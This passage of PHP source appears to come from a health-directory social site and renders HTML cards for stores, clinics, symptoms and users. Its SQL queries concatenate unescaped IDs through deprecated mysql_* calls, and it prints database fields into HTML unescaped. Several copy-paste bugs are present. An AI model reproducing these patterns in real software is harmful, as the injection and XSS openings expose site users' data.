            $str.= 'href="javascript:" onclick="favourite(\'1\',\'' . $userdata['id'] . '\',\'store\',\'followc' . $i . '\',' . $allfollow . ')" ><i class="fa fa-fw fa-star star-color"></i> ' . $allfollow . ' </a>';
        }
    } else {

        $str.= 'href="#login" data-toggle="modal" ><i class="fa fa-fw fa-star star-color"></i> ' . $allfollow . ' </a>';
    }

    $str.= '   </li>';

   $str.='<li> <a href="javascript:" style="text-decoration: none;">'.date('d-m-Y g:i A',strtotime($userdata['created'])).'</a></li>';
    $str.= '
                        </ul>
                    </div>

                 </div>
                </div>';
    return $str;
}

function getcommentByID($id) {
    $row = mysql_fetch_array(mysql_query("SELECT * FROM `comment` WHERE `id`='" . $id . "'"));
    return $row;
}

function getlikesbyid($id) {
    $row = mysql_fetch_array(mysql_query("SELECT * FROM `likes` WHERE `id`='" . $id . "'"));
    return $row;
}
//user like box
function getlikesbox($i, $id) {
    $str = "";

    $followdetails = getlikesbyid($id);
    $userdata = getUserById($followdetails['user_id']);



    $img = IMAGE_URL . "profile/40/" . $userdata['photo'];

    if (!file_exists($img)) {
        $img = SITE_URL . "images/temp40.jpg";
    } else {
        $img = SITE_URL . "uploades/profile/40/" . $userdata['photo'];
    }

    $deg = "";
    if ($userdata['user_type'] == '1') {
        $deg = getStateByID($userdata['state']);
    }
    if ($userdata['user_type'] == '2') {
        $deg = $userdata['specialization'];
    }
    if ($userdata['user_type'] == '3') {
        $deg = "Student, " . $userdata['specialization'];
    }
    if ($userdata['user_type'] == '4') {
        $deg = "Company, " . getStateByID($userdata['state']);
    }
    if ($userdata['user_type'] == '5') {
        $deg = "Product, " . $userdata['department'];
    }

    $address = "";
    $followed = array();
    if ($followdetails['type'] == "store") {
        $followed = getStoreById($followdetails['liked_id']);

        $str = getstorecontent($followed, $i);
    }
    if ($followdetails['type'] == "clinics") {
        $followed = getClinicsById($followdetails['liked_id']);
        $str = getClinicContent($followed, $i);
    }
    if ($followdetails['type'] == "symptoms") {
        $followed = getSymptomsById($followdetails['liked_id']);
        $str = getSymptomsContent($followed, $i);
    }
    if ($followdetails['type'] == "users") {
        $followed = getUserById($followdetails['liked_id']);
        $str = getUserscontent($followed, $i);
    }
    return $str;
}

function getstorecontent($row, $i) {
    $address = "";
    $address.=$row['address'] != "" ? $row['address'] : '';
    $address.=$row['state'] != "" ? ", " . getStateByID($row['state']) : '';
    $address.=$row['city'] != "" ? ", " . getCityByID($row['city']) : '';
    $address.=$row['pin'] != "" ? "-" . $row['pin'] : '';
    $address.="<br>";
    $address.=$row['phno'] != "" ? " <i class='fa fa-phone'></i> " . $row['phno'] : '';
    $address.=$row['website'] != "" ? " <i class='fa fa-desktop'></i> " . $row['website'] : '';
    $allfollow = getallfavourite('store', $row['id']);
    $str = ' <div class="data-div"
                 >
                <div class="default-image"><img src="images/temp.jpg" alt=""/></div>
                <div class="blue-heading">' . sentence_cap(" ", $row['name']) . '<div class="desg"> Store ,' . getCityByID($row['city']) . '</div> </div>
                <div class="address-box">
                    ' . $address . '
                        <ul>
                            <li id="likes' . $i . '"><a ';
    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {
        $ro = getislike('store', $row['id']);
        if ($ro['id'] != "") {
            $str.= 'href="javascript:" onclick="like(\'0\',\'' . $row['id'] . '\',\'store\',\'likes' . $i . '\')" >Unlike</a>';
        } else {
            $str.= 'href="javascript:" onclick="like(\'1\',\'' . $row['id'] . '\',\'store\',\'likes' . $i . '\')" >Like</a>';
        }
    } else {

        $str.= 'href="#login" data-toggle="modal" >Like</a>';
    }
    $str .= ' </li>
                           <li id="follow' . $i . '"><a ';
    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $ro = getisfavourite('store', $row['id']);
        if ($ro['id'] != "") {
            $str.= 'href="javascript:" onclick="favourite(\'0\',\'' . $row['id'] . '\',\'store\',\'follow' . $i . '\',' . $allfollow . ')" ><i class="fa fa-fw fa-star star-color"></i> ' . $allfollow . '</a>';
        } else {
            $str.= 'href="javascript:" onclick="favourite(\'1\',\'' . $row['id'] . '\',\'store\',\'follow' . $i . '\',' . $allfollow . ')" ><i class="fa fa-fw fa-star star-color"></i> ' . $allfollow . ' </a>';
        }
    } else {

        $str.= 'href="#login" data-toggle="modal" ><i class="fa fa-fw fa-star star-color"></i> ' . $allfollow . ' </a>';
    }
    $str.= '
                                   </li>
                        </ul>


                </div>

            </div>';
    return $str;
}

function getClinicContent($row, $i) {
    $address = "";
    $address.=$row['address'] != "" ? $row['address'] : '';
    $address.=$row['state'] != "" ? ", " . getStateByID($row['state']) : '';
    $address.=$row['city'] != "" ? ", " . getCityByID($row['city']) : '';
    $address.=$row['pin'] != "" ? "-" . $row['pin'] : '';
    $address.="<br>";
    $address.=$row['phno'] != "" ? " <i class='fa fa-phone'></i> " . $row['phno'] : '';
    $address.=$row['website'] != "" ? " <i class='fa fa-desktop'></i> " . $row['website'] : '';
    $allfollow = getallfavourite('clinics', $row['id']);
    $str = ' <div class="data-div"
                 >
                <div class="default-image"><img src="images/temp.jpg" alt=""/></div>
                <div class="blue-heading">' . sentence_cap(" ", $row['name']) . ' <div class="desg"> Clinic/Hospital ,' . getCityByID($row['city']) . '</div></div>
                <div class="address-box">
                    ' . $address . '
                        <ul>
                            <li id="likes' . $i . '"><a ';
    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {
        $ro = getislike('store', $row['id']);
        if ($ro['id'] != "") {
            $str.= 'href="javascript:" onclick="like(\'0\',\'' . $row['id'] . '\',\'clinics\',\'likes' . $i . '\')" >Unlike</a>';
        } else {
            $str.= 'href="javascript:" onclick="like(\'1\',\'' . $row['id'] . '\',\'clinics\',\'likes' . $i . '\')" >Like</a>';
        }
    } else {

        $str.= 'href="#login" data-toggle="modal" >Like</a>';
    }
    $str .= ' </li><li id="recommend' . $i . '"><a ';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $str .= ' href="javascript:" onclick="emailmodal(\'clinics\',\'' . $row['id'] . '\')">Recommend</a>';
    } else {

        $str .= ' href="#login" data-toggle="modal" >Recommend</a>';
    }


    $str .= ' </li>
                           <li id="follow' . $i . '"><a ';
    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $ro = getisfavourite('store', $row['id']);
        if ($ro['id'] != "") {
            $str.= 'href="javascript:" onclick="favourite(\'0\',\'' . $row['id'] . '\',\'store\',\'follow' . $i . '\',' . $allfollow . ')" ><i class="fa fa-fw fa-star star-color"></i> ' . $allfollow . '</a>';
        } else {
            $str.= 'href="javascript:" onclick="favourite(\'1\',\'' . $row['id'] . '\',\'store\',\'follow' . $i . '\',' . $allfollow . ')" ><i class="fa fa-fw fa-star star-color"></i> ' . $allfollow . ' </a>';
        }
    } else {

        $str.= 'href="#login" data-toggle="modal" ><i class="fa fa-fw fa-star star-color"></i> ' . $allfollow . ' </a>';
    }
    $str.= '
                                   </li>
                        </ul>


                </div>

            </div>';
    return $str;
}

function getSymptomsContent($row, $i) {



    $str = ' <div class="data-div"
                  >
                <div class="default-image"><img src="images/temp.jpg" alt=""/></div>
                <div class="blue-heading">' . sentence_cap(" ", $row['name']) . ' </div>
                <div class="address-box" style="width:471px;">
                    ' . $row['description'] . '
                        <ul>
                            <li id="likes' . $i . '"><a ';
    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {
        $ro = getislike('symptoms', $row['id']);
        if ($ro['id'] != "") {
            $str.= 'href="javascript:" onclick="like(\'0\',\'' . $row['id'] . '\',\'symptoms\',\'likes' . $i . '\')" >Unlike</a>';
        } else {
            $str.= 'href="javascript:" onclick="like(\'1\',\'' . $row['id'] . '\',\'symptoms\',\'likes' . $i . '\')" >Like</a>';
        }
    } else {

        $str.= 'href="#login" data-toggle="modal" >Like</a>';
    }
    $str .= ' </li><li id="recommend' . $i . '"><a ';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $str .= ' href="javascript:" onclick="emailmodal(\'symptoms\',\'' . $row['id'] . '\')">Recommend</a>';
    } else {

        $str .= ' href="#login" data-toggle="modal" >Recommend</a>';
    }
    $str .= ' </li>';
    $sesimg = SITE_URL . "images/temp40.jpg";
    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {
        $sesdetails = getUserById($_SESSION['id']);
        $sesimg = IMAGE_URL . "profile/40/" . $sesdetails['photo'];

        if (!file_exists($sesimg)) {
            $sesimg = SITE_URL . "images/temp40.jpg";
        } else {
            $sesimg = SITE_URL . "uploades/profile/40/" . $sesdetails['photo'];
        }
    }

    $str .= '
                        <li><a class="comment_button" ';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $str .= ' href="javascript:"  onclick="showcommentbox(\'com' . $i . '\')" ';
    } else {

        $str .= ' href="#login" data-toggle="modal" ';
    }

    $str .= '    >Comment</a></li>
                        </ul>';


    $str .= '
<div class="panel1" id="com' . $i . '">
    <div class="pnl-comment">
        <div class="input-group">
            <div class="div-box"><img src="' . $sesimg . '" alt=""   /></div>
            <div class="comment-frm"> <form id="cfm' . $i . '" method="post" action="#" onsubmit="return makecomment(' . $i . ')"  >
                    <input class="form-control box"  placeholder="Say something..."  name="message" required="" id="message' . $i . '">
                    <input type="hidden" id="id" name="id" value="' . $row['id'] . '">
                    <input type="hidden" id="type" name="type" value="symptoms">
                    <input id="bt' . $i . '"   type="submit" style="width: 0px !important; height: 0px !important; border: none;"/>
                </form>
            </div>
        </div>
        <div class="actionBox">
            <ul class="commentList" id="clist' . $i . '">';
    $str .= getComment('symptoms', $row['id']);

    $str .= '  </ul>
       </div>
         </div>
           </div> </div>




            </div>';
    return $str;
}

function getUserscontent($row, $i, $msg = '') {

    if ($row['user_type'] == '1') {
        $deg = getStateByID($row['state']);
    }
    if ($row['user_type'] == '2') {
        $deg = $row['specialization'];
    }
    if ($row['user_type'] == '3') {
        $deg = "Student, " . $row['specialization'];
    }
    if ($row['user_type'] == '4') {
        $deg = "Company, " . getStateByID($row['state']);
    }
    if ($row['user_type'] == '5') {
        $deg = "Product, " . $row['department'];
    }

    $img = IMAGE_URL . "profile/40/" . $row['photo'];

    if (!file_exists($img)) {
        $img = SITE_URL . "images/temp40.jpg";
    } else {
        $img = SITE_URL . "uploades/profile/40/" . $row['photo'];
    }


    $address = "";
    $address.=trim($row['address1']) != "" ? $row['address1'] : '';
    $address.=trim($row['state']) != "" ? ", " . getStateByID($row['state']) : '';
    $address.=trim($row['city']) != "" ? ", " . getCityByID($row['city']) : '';
    $address.=trim($row['zip']) != "" ? "-" . $row['zip'] : '';
    $address.="<br>";
    $address.=trim($row['phone_no']) != "" ? " <i class='fa fa-phone'></i> " . $row['phone_no'] : '';
    $address.=trim($row['website']) != "" ? " <i class='fa fa-desktop'></i> " . $row['website'] : '';
    $address.=trim($row['fax_no']) != "" ? " <i class='fa fa-print'></i>  " . $row['fax_no'] : '';

    $allfollow = getallfavourite('users', $row['id']);
    $str = ' <div class="data-div"
                  >
                <div class="default-image"><img src="' . $img . '" alt=""/></div>
                <div class="blue-heading">' . sentence_cap(" ", $row['f_name'] . $row['l_name']) . '<div class="desg">' . $deg . '</div> </div>
                <div class="address-box" style="width:401px;">';
    if ($msg != "") {
        $str .= $msg . '<br>';
    }

    $str .= $address . '
                        <ul>
                            <li id="likes' . $i . '"><a ';
    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {
        $ro = getislike('users', $row['id']);
        if ($ro['id'] != "") {
            $str.= 'href="javascript:" onclick="like(\'0\',\'' . $row['id'] . '\',\'users\',\'likes' . $i . '\')" >Unlike</a>';
        } else {
            $str.= 'href="javascript:" onclick="like(\'1\',\'' . $row['id'] . '\',\'users\',\'likes' . $i . '\')" >Like</a>';
        }
    } else {

        $str.= 'href="#login" data-toggle="modal" >Like</a>';
    }
    $str .= ' </li>
              <li id="follow' . $i . '"><a ';
    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $ro = getisfavourite('users', $row['id']);
        if ($ro['id'] != "") {
            $str.= 'href="javascript:" onclick="favourite(\'0\',\'' . $row['id'] . '\',\'users\',\'follow' . $i . '\',' . $allfollow . ')" ><i class="fa fa-fw fa-star star-color"></i> ' . $allfollow . '</a>';
        } else {
            $str.= 'href="javascript:" onclick="favourite(\'1\',\'' . $row['id'] . '\',\'users\',\'follow' . $i . '\',' . $allfollow . ')" ><i class="fa fa-fw fa-star star-color"></i> ' . $allfollow . ' </a>';
        }
    } else {

        $str.= 'href="#login" data-toggle="modal" ><i class="fa fa-fw fa-star star-color"></i> ' . $allfollow . ' </a>';
    }

    $str.= '</li>';

    $sesimg = SITE_URL . "images/temp40.jpg";

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {
        $sesdetails = getUserById($_SESSION['id']);
        $sesimg = IMAGE_URL . "profile/40/" . $sesdetails['photo'];

        if (!file_exists($sesimg)) {
            $sesimg = SITE_URL . "images/temp40.jpg";
        } else {
            $sesimg = SITE_URL . "uploades/profile/40/" . $sesdetails['photo'];
        }
    }


    $str .= '
    <li><a class="comment_button" ';

    if (isset($_SESSION['id']) && $_SESSION['id'] != "") {

        $str .= ' href="javascript:"  onclick="showcommentbox(\'com' . $i . '\')" ';
    } else {

        $str .= ' href="#login" data-toggle="modal" ';
    }

    $str .= '    >Comment</a></li>
                        </ul>';


    $str .= '
        <div class="panel1" id="com' . $i . '">
            <div class="pnl-comment">
                <div class="input-group">
                    <div class="div-box"><img src="' . $sesimg . '" alt=""   /></div>
                    <div class="comment-frm"> <form id="cfm' . $i . '" method="post" action="#" onsubmit="return makecomment(' . $i . ')"  >
                            <input class="form-control box"  placeholder="Say something..."  name="message" required="" id="message' . $i . '">
                            <input type="hidden" id="id" name="id" value="' . $row['id'] . '">
                            <input type="hidden" id="type" name="type" value="users">
                            <input id="bt' . $i . '"   type="submit" style="width: 0px !important; height: 0px !important; border: none;"/>
                        </form>
                    </div>
                </div>
                <div class="actionBox">
                    <ul class="commentList" id="clist' . $i . '">';
    $str .= getComment('users', $row['id']);
    $str .= '  </ul>
               </div>
                 </div>
                   </div>
</div>
            </div>';


    return $str;
}

function getFavouritesbyid($id) {
    $row = mysql_fetch_array(mysql_query("SELECT * FROM `favourite` WHERE `id`='" . $id . "'"));
    return $row;
}

function getFavouritesbox($i, $id) {
    $str = "";

    $followdetails = getFavouritesbyid($id);
    $userdata = getUserById($followdetails['user_id']);



    $img = IMAGE_URL . "profile/40/" . $userdata['photo'];

    if (!file_exists($img)) {
        $img = SITE_URL . "images/temp40.jpg";
    } else {
        $img = SITE_URL . "uploades/profile/40/" . $userdata['photo'];
    }

    $deg = "";
    if ($userdata['user_type'] == '1') {
        $deg = getStateByID($userdata['state']);
    }
    if ($userdata['user_type'] == '2') {
        $deg = $userdata['specialization'];
    }
    if ($userdata['user_type'] == '3') {
        $deg = "Student, " . $userdata['specialization'];
    }
    if ($userdata['user_type'] == '4') {
        $deg = "Company, " . getStateByID($userdata['state']);
    }
    if ($userdata['user_type'] == '5') {
        $deg = "Product, " . $userdata['department'];
    }

    $address = "";
    $followed = array();
    if ($followdetails['type'] == "store") {
        $followed = getStoreById($followdetails['favourite_id']);

        $str = getstorecontent($followed, $i);
    }
    if ($followdetails['type'] == "clinics") {
        $followed = getClinicsById($followdetails['favourite_id']);
        $str = getClinicContent($followed, $i);
    }
    if ($followdetails['type'] == "symptoms") {
        $followed = getSymptomsById($followdetails['favourite_id']);
        $str = getSymptomsContent($followed, $i);
    }
    if ($followdetails['type'] == "users") {
        $followed = getUserById($followdetails['favourite_id']);
        $str = getUserscontent($followed, $i);
    }
    return $str;
}

function getFollowingbox($i, $id) {
    $str = "";

    $followdetails = getFollowById($id);
    if ($followdetails['type'] == "store") {
        $followed = getStoreById($followdetails['follow_id']);

        $str = getstorecontent($followed, $i);
    }
    if ($followdetails['type'] == "clinics") {
        $followed = getClinicsById($followdetails['follow_id']);
        $str = getClinicContent($followed, $i);
    }
    if ($followdetails['type'] == "symptoms") {
        $followed = getSymptomsById($followdetails['follow_id']);
        $str = getSymptomsContent($followed, $i);
    }
    if ($followdetails['type'] == "users") {
        $followed = getUserById($followdetails['user_id']);
        $str = getUserscontent($followed, $i);
    }
    return $str;
}

function getViewesbyid($id) {
    $row = mysql_fetch_array(mysql_query("SELECT * FROM `viewes` WHERE `id`='" . $id . "'"));
    return $row;
}

function getViewesbox($i, $id) {
    $str = "";

    $followdetails = getViewesbyid($id);

    if ($followdetails['type'] == "store") {
        $followed = getStoreById($followdetails['user_id']);

        $str = getstorecontent($followed, $i);
    }
    if ($followdetails['type'] == "clinics") {
        $followed = getClinicsById($followdetails['user_id']);
        $str = getClinicContent($followed, $i);
    }
    if ($followdetails['type'] == "symptoms") {
        $followed = getSymptomsById($followdetails['user_id']);
        $str = getSymptomsContent($followed, $i);
    }
    if ($followdetails['type'] == "users") {
        $followed = getUserById($followdetails['user_id']);
        $str = getUserscontent($followed, $i, 'Viewed on ' . date('F-d-Y h:m:s', strtotime($followdetails['created'])));
    }
    return $str;
}


function printarray($arr) {
    echo "<pre>";
    print_r($arr);
    exit;
}

